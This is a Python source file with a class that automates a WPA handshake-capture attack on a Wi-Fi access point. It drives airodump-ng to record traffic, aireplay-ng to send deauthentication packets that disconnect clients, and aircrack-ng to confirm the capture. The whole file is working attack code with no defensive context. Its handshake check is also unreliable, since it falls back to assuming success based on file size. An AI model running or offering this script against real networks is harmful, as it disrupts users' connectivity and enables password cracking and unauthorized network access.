import subprocess
import os
import time

class HandshakeCapture:
    def __init__(self, interface, bssid, channel, output_dir="/tmp"):
        self.interface = interface
        self.bssid = bssid
        self.channel = str(channel)
        self.output_file = os.path.join(output_dir, f"capture-{bssid.replace(':', '')}")
        self.airodump_proc = None
        self.aireplay_proc = None

    def start_capture(self):
        """Start airodump-ng to capture packets and handshake."""
        try:
            cmd = [
                "airodump-ng",
                "--bssid", self.bssid,
                "--channel", self.channel,
                "--write", self.output_file,
                "--output-format", "cap",
                self.interface
            ]
            self.airodump_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            return True
        except Exception as e:
            raise Exception(f"Failed to start airodump-ng: {e}")

    def send_deauth(self, count=15):
        """Send deauthentication packets to force WPA handshake."""
        try:
            # Wait a bit for airodump to establish
            time.sleep(2)
            
            cmd = [
                "aireplay-ng",
                "--deauth", str(count),
                "-a", self.bssid,
                self.interface
            ]
            self.aireplay_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            self.aireplay_proc.wait(timeout=10)
            return True
        except Exception as e:
            raise Exception(f"Failed to send deauth packets: {e}")

    def stop_capture(self):
        """Stop airodump-ng capture."""
        if self.airodump_proc:
            self.airodump_proc.terminate()
            try:
                self.airodump_proc.wait(timeout=5)
            except:
                self.airodump_proc.kill()

    def get_cap_file(self):
        """Get the capture file path."""
        return f"{self.output_file}.cap"

    def check_handshake(self):
        """Check if handshake was captured using aircrack-ng."""
        cap_file = self.get_cap_file()
        if not os.path.exists(cap_file):
            return False
        
        try:
            cmd = ["aircrack-ng", "-J", "/tmp/pmkid_test", cap_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            # aircrack-ng returns output showing if handshake was found
            return "1 handshake" in result.stdout or "handshake" in result.stdout.lower()
        except:
            # If aircrack-ng fails, assume cap file exists and might be valid
            return os.path.getsize(cap_file) > 50000
